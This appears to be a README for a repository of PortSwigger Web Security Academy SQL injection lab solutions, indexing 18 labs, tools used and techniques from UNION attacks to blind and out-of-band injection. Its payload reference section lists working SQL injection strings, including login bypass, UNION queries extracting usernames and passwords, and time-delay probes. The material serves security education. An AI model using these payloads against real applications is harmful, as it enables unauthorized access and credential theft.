# 💉 PortSwigger SQL Injection Labs

> Solutions and write-ups for the **SQL Injection** module from [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection).

---

## 📖 What is SQL Injection?

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It can allow attackers to:

- View data they are not normally able to retrieve (e.g., other users' credentials)
- Modify or delete data, causing persistent changes
- Bypass authentication and access controls
- In some cases, escalate to full server compromise

---

## 🗂️ Lab Index

### 🟢 Apprentice

| # | Lab | Technique | Status |
|---|-----|-----------|--------|
| 1 | SQL injection vulnerability in WHERE clause allowing retrieval of hidden data | In-band SQLi | ✅ |
| 2 | SQL injection vulnerability allowing login bypass | Auth Bypass | ✅ |

### 🟡 Practitioner

| # | Lab | Technique | Status |
|---|-----|-----------|--------|
| 3 | SQL injection UNION attack, determining the number of columns returned by the query | UNION-based | ✅ |
| 4 | SQL injection UNION attack, finding a column containing text | UNION-based | ✅ |
| 5 | SQL injection UNION attack, retrieving data from other tables | UNION-based | ✅ |
| 6 | SQL injection UNION attack, retrieving multiple values in a single column | UNION-based | ✅ |
| 7 | SQL injection attack, querying the database type and version on Oracle | DB Enumeration | ✅ |
| 8 | SQL injection attack, querying the database type and version on MySQL and Microsoft | DB Enumeration | ✅ |
| 9 | SQL injection attack, listing the database contents on non-Oracle databases | DB Enumeration | ✅ |
| 10 | SQL injection attack, listing the database contents on Oracle | DB Enumeration | ✅ |
| 11 | Blind SQL injection with conditional responses | Blind SQLi | ✅ |
| 12 | Blind SQL injection with conditional errors | Blind SQLi | ✅ |
| 13 | Visible error-based SQL injection | Error-based | ✅ |
| 14 | Blind SQL injection with time delays | Blind SQLi (Time) | ✅ |
| 15 | Blind SQL injection with time delays and information retrieval | Blind SQLi (Time) | ✅ |
| 16 | Blind SQL injection with out-of-band interaction | OOB SQLi | ✅ |
| 17 | Blind SQL injection with out-of-band data exfiltration | OOB SQLi | ✅ |
| 18 | SQL injection with filter bypass via XML encoding | WAF Bypass | ✅ |

---

## 🧠 Techniques Covered

### In-Band SQLi
Direct retrieval of data through the same channel used to inject the SQL.

- **UNION attacks** — Appending extra `SELECT` statements to retrieve data from other tables
- **Error-based** — Using database error messages to extract information

### Blind SQLi
No data is returned directly; results are inferred through application behavior.

- **Boolean-based** — Sending payloads and observing True/False responses
- **Time-based** — Using database delays (`SLEEP`, `pg_sleep`, `WAITFOR DELAY`) to infer results

### Out-of-Band (OOB) SQLi
Exfiltrating data via a separate channel such as DNS or HTTP requests (requires Burp Collaborator).

### WAF Bypass
Using encoding techniques (e.g., XML entities via Hackverter) to bypass Web Application Firewalls.

---

## 🛠️ Tools & Environment

| Tool | Purpose |
|------|---------|
| [Burp Suite](https://portswigger.net/burp) | Intercepting and modifying HTTP requests |
| Browser DevTools | Observing responses and cookies |
| [PortSwigger Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) | Syntax reference for multiple DBs |
| Hackverter (Burp Extension) | Encoding payloads to bypass WAF |

---

## 📂 Repository Structure

```
SQL-Injection/
├── 01-hidden-data/
├── 02-login-bypass/
├── 03-union-num-columns/
├── 04-union-column-text/
├── 05-union-retrieve-data/
├── 06-union-multiple-values/
├── 07-db-version-oracle/
├── 08-db-version-mysql-mssql/
├── 09-db-contents-non-oracle/
├── 10-db-contents-oracle/
├── 11-blind-conditional-responses/
├── 12-blind-conditional-errors/
├── 13-visible-error-based/
├── 14-blind-time-delays/
├── 15-blind-time-delays-retrieval/
├── 16-blind-oob-interaction/
├── 17-blind-oob-exfiltration/
└── 18-xml-filter-bypass/
```

---

## 💡 Key Payloads Reference

### Auth Bypass
```sql
administrator'--
' OR 1=1--
```

### UNION — Determine Column Count
```sql
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

### UNION — Retrieve Data
```sql
' UNION SELECT username, password FROM users--
' UNION SELECT NULL, username||'~'||password FROM users--
```

### DB Version
```sql
-- MySQL / MSSQL
' UNION SELECT @@version,NULL--

-- Oracle
' UNION SELECT banner,NULL FROM v$version--

-- PostgreSQL
' UNION SELECT version(),NULL--
```

### Blind — Boolean-Based
```sql
' AND 1=1--      -- True
' AND 1=2--      -- False
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```

### Blind — Time-Based
```sql
-- PostgreSQL
'; SELECT pg_sleep(5)--

-- MySQL
'; SELECT SLEEP(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
```

---

## ⚠️ Disclaimer

> This repository is strictly for **educational purposes**. All labs are performed on intentionally vulnerable environments provided by PortSwigger Web Security Academy. Never attempt these techniques on systems you do not own or have explicit permission to test.

---

## 📚 References

- [PortSwigger SQL Injection Learning Path](https://portswigger.net/web-security/sql-injection)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
